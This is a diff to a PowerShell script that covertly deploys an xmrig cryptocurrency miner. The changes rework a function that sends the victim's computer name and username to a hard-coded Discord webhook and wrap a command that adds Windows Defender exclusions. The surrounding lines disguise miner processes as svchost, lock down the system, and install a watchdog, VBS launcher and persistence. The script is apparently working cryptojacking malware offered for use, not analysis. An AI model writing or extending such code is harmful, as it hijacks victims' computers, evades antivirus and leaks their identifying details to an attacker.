@@ -210,8 +210,17 @@ function Disable-Sleep {
 function Send-DiscordWebhook {
     $webhookUrl = "https://discord.com/api/webhooks/1506387263402278992/f3X-mX_mjq74YCqpZYNB2WH4hEg6NZj8LY6lPstCCtz31kJwthqkxXF580E187PnZI2a"
     try {
-        $payload = @{ username = "itzcurled-miner"; embeds = @(@{ title = "Miner Active! ⚡"; color = 3447003; fields = @(@{ name = "Host"; value = "$env:COMPUTERNAME"; inline = $true }, @{ name = "User"; value = "$env:USERNAME"; inline = $true }); timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") }) } | ConvertTo-Json -Depth 5
-        Invoke-RestMethod $webhookUrl -Method Post -Body $payload -ContentType "application/json" | Out-Null
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        # Use simple escaping to avoid JSON breakage
+        $h = $env:COMPUTERNAME -replace '[^\x20-\x7E]', '' -replace '"', '\"'
+        $u = $env:USERNAME -replace '[^\x20-\x7E]', '' -replace '"', '\"'
+        $t = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
+        
+        $json = '{"username":"itzcurled-miner","embeds":[{"title":"Miner Active! ⚡","color":3447003,"fields":[{"name":"Host","value":"' + $h + '","inline":true},{"name":"User","value":"' + $u + '","inline":true}],"timestamp":"' + $t + '"}]}'
+        
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("Content-Type", "application/json")
+        $wc.UploadData($webhookUrl, "POST", [System.Text.Encoding]::UTF8.GetBytes($json)) | Out-Null
     } catch {}
 }
 
@@ -223,7 +232,7 @@ try {
         Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $xmrigExe } | Stop-Process -Force -ErrorAction SilentlyContinue
     } catch {}
 
-    Add-MpPreference -ExclusionPath $installDir, "$env:TEMP" -ErrorAction SilentlyContinue
+    try { Add-MpPreference -ExclusionPath $installDir, "$env:TEMP" -ErrorAction SilentlyContinue } catch {}
     Lockdown-System
     Disable-Sleep; Enable-HugePages
     Install-Miner; Write-MinerConfig; Write-Watchdog; Write-VbsLauncher; Set-Persistence
@@ -233,3 +242,4 @@ try {
     Send-DiscordWebhook
     Write-Host "[+] Pro Deploy Success."
 } catch { Write-Host "[-] Error: $_" }
+    
